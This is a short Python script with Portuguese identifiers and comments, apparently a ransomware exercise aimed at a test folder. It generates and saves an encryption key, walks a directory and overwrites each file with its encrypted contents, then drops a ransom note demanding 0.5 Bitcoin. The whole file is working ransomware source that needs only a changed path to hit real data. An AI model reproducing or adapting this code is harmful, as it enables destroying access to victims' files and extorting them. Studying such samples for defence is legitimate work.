from cryptography.fernet import Fernet
import os

DIRETORIO_ALVO = "Teste_Files"

#1. Gerar uma chave de cryptografia e salvar
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#2. Carregar a chave salva
def carregar_chave():
    return open("chave.key", "rb").read()

#3. Criptografar um único arquivo
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo,"rb") as file:
        dados = file.read()
    dados_encriptados =f.encrypt(dados)
    with open(arquivo,"wb") as file:
        file.write(dados_encriptados)

#4. Encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome.lower() != "Ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate
def criar_mensagem_resgate():
    with open("Leia Isso.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 0.5 Bitcoin para a conta TestandoOBexta\n")
        f.write("Após a confirmação seus arquivos serão liberados")

#6. Execução Principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("Teste_Files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ransoware executado")

if __name__ == "__main__":
    main()